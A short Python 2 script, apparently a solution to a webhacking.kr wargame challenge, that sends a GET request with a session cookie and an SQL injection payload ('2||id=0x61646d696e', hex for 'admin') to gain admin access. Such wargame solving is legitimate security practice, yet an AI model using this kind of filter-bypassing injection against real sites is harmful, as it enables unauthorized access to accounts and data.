import requests

url = "http://webhacking.kr/challenge/web/web-24/index.php"


headers = {

	"Host": "webhacking.kr",
	"Cookie": "PHPSESSID=3771a272772a41afe329096cccbd8dc6"
}

params = {
	"lv":"2||id=0x61646d696e"
	
}

req = requests.get(url, params=params,headers=headers)

print req.content

